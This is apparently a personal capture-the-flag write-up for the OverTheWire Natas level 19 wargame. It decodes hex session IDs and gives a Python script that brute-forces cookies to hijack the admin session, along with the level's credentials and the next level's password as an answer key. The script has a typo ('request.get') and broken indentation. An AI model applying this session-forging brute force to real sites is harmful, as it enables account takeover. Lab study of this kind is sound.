```
Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
URL:      http://natas19.natas.labs.overthewire.org
```

- this level is similar to the previous one, but the session IDs are no longer sequential
- what this means is that i cannot find the password by simple iteration
- after trying to log in with the username test and password test, i go to the storage tab and inspect the session ID generated
- this time, it is not a number, but what looks like a hex-encoded value
- using cyberchef, i decode this value and get: 364-test
- so this time, the session ID is a random number, probably between 0 and 640, as in the previous level, but to this is added the username, and everything is hex-encoded
- to find the correct session ID, i can modify the script from the previous level, to create the brute force list by adding the admin username to a number between 0 and 640, and hex encoding everythin

```python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

MAX = 640
count = 1

u="http://natas19.natas.labs.overthewire.org/index.php?debug"

while count <= MAX:
    hexNumber = "".join("{:02x}".format(ord(c)) for c in str(count))
    hexAdmin = "2d61646d696e"
    sessionID = "PHPSESSID=" + hexNumber + hexAdmin
    print(sessionID)
    
    headers = {'Cookie': sessionID}
    response = request.get(u, headers=headers, auth=basicAuth, verify=False)
    
    if "You are logged in as a regular user" not in response.text:
	    print(response.text)
	    break
	    
	count += 1

print("Done!")
```

# Password

- **p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw**
